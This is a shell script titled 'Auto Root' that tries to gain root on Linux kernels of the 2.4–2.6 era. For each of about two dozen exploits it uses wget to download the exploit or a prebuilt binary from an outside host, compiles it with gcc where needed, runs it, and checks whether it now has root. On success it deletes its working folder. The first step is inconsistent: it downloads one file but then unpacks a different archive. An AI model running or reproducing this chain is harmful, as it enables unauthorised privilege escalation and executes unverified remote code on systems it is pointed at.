#!/bin/sh
# Auto Root
#   _____          __           __________               __
#  /  _  \  __ ___/  |_  ____   \______   \ ____   _____/  |_
# /  /_\  \|  |  \   __\/  _ \   |       _//  _ \ /  _ \   __\
#/    |    \  |  /|  | (  <_> )  |    |   (  <_> |  <_> )  |
#\____|__  /____/ |__|  \____/   |____|_  /\____/ \____/|__|
#        \/                             \/
#To start script "./aroot.sh"
#Developers: Taylor C Newsome
#Greetz: Aush0k , Durandal , Starfall , User , DZK , RaT , Smelly , Sh0ckFR , Adware , Mobman , Grabitel & Devout
#Begin code
checkroot() {
if [ "$(id -u)" = "0" ]; then
cd ..;
rm -r expl;
echo "Got root :D";
exit;
else
echo "No good. Still "`whoami`;
echo "";
fi;
}

uname -a;
mkdir expl;
cd expl;
echo "Checking if already root...";
checkroot;

echo "Trying wunderbar...";
wget https://raw.githubusercontent.com/SleepTheGod/Windows/main/pwnkernel.sh;
tar -xvf sock-sendpage-local-root-exploit.tar.gz;
cd sock-sendpage-local-root-exploit;
./wunderbar_emporium.sh;
checkroot;

echo "Trying gayros...";
wget https://raw.githubusercontent.com/SleepTheGod/Windows/main/local-root-exploit-gayros.c;
gcc -o gayros local-root-exploit-gayros.c;
./gayros;
checkroot;

echo "Trying vmsplice...";
wget http://www.tux-planet.fr/public/hack/exploits/kernel/vmsplice-local-root-exploit.c;
gcc -o vmsplice-local-root-exploit vmsplice-local-root-exploit.c;
./vmsplice-local-root-exploit;
checkroot;

echo "Trying 2.6.x localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/x2;
./x2;
checkroot;

echo "Trying 2.6.24 localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.24/2.6.24x.c;
gcc 2.6.24x.c -o 2.6.24x;
./2.6.24x;
checkroot;

echo "Trying 2.4-2.6 [ pwned ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.4%202.6/pwned.c;
gcc pwned.c -o pwned;
./pwned;
checkroot;

echo "Trying 2.6.4 [ hudo ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.4/hudo.c;
gcc hudo.c -o hudo;
./hudo;
checkroot;

echo "Trying 2.6.9-22 [ prctl ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.9-22/prctl.c;
gcc prctl.c -o prctl;
./prctl;
checkroot;

echo "Trying 2.6.12 [ elfcd2 ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.12/elfcd2.c;
gcc elfcd2.c -o elfcd2;
./elfcd2;
checkroot;

echo "Trying 2.6.13-17 localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.13-17/2.6.13_17_4_2011.sh;
chmod 755 2.6.13_17_4_2011.sh;
./2.6.13_17_4_2011.sh;
checkroot;

echo "Trying 2.6.13 [ raptor-prctl ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.13/raptor-prctl.c;
gcc raptor-prctl.c -o raptor-prctl;
./raptor_prctl;
checkroot;

echo "Trying 2.6.14 [ raptor ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.14/raptor;
chmod 777 raptor;
./raptor;
checkroot;

echo "Trying 2.6.15 [ raptor ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.15/raptor;
chmod 777 raptor;
./raptor;
checkroot;

echo "Trying 2.6.17-4 [ raptor-prctl ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.17-4/raptor-prctl.c;
gcc raptor-prctl.c -o raptor-prctl;
./raptor-prctl;
checkroot;

echo "Trying 2.6.10 [ uselib24 ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.10/uselib24.c;
gcc uselib24.c -o uselib24;
./uselib24;
checkroot;

echo "Trying 2.6.11 [ krad ] localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.11/krad;
chmod 777 krad;
./krad;
checkroot;

echo "Trying 2.6.x localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/x;
chmod 777 x;
./x;
checkroot;

echo "Trying 2.6.x [ uselib24 ] localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/uselib24;
chmod 777 uselib24;
./uselib24;
checkroot;

echo "Trying 2.6.x [ root2 ] localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/root2;
chmod 777 root2;
./root2;
checkroot;

echo "Trying 2.6.x [ kmod2 ] localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/kmod2;
chmod 777 kmod2;
./kmod2;
checkroot;

echo "Trying 2.6.23 localroot...";
wget http://s3ym3n.by.ru/localroot/2.6.23/2.6.23.c;
gcc 2.6.23.c -o 2.6.23;
./2.6.23;
checkroot;

echo "Trying 2.6.x localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/exp.sh;
chmod 755 exp.sh;
./exp.sh;
checkroot;

echo "Trying 2.6.x [ elflbl ] localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/elflbl;
chmod 777 elflbl;
./elflbl;
checkroot;

echo "Trying 2.6.x [ cw7.3 ] localroot...";
wget http://rmccurdy.com/scripts/downloaded/localroot/2.6.x/cw7.3;
chmod 777 cw7.3;
./cw7.3;
checkroot;

echo "Done with exploits. Failed to achieve root :<";  
